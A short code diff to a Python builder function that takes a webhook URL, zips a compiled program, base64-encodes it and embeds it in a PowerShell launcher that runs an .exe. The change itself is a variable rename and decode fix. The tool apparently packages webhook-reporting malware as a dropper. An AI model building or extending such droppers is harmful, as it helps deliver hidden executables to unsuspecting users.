@@ -39,12 +39,12 @@ def build(webhook: str, output: str):
     os.remove(output+".py")
     print(f"[{Fore.CYAN}*{Fore.RESET}] Folder zipping...")
     folderzipping(output, "dist")
-    zipbas64 = base64.b64encode(open(output+".zip", "rb").read())
+    zipbase64 = base64.b64encode(open(output+".zip", "rb").read())
     os.remove(output+".zip")
 
     print(f"{'-'*30} Configure launcher... {'-'*30}")
     with open("core/template/launcher.tm", "r") as f:
-        template = f.read().replace(r"%b64zip%", zipbas64)
+        template = f.read().replace(r"%b64zip%", zipbase64.decode())
         template = template.replace(r"%exec%", output+".exe")
     
     with open(output+".ps1", "w") as f:
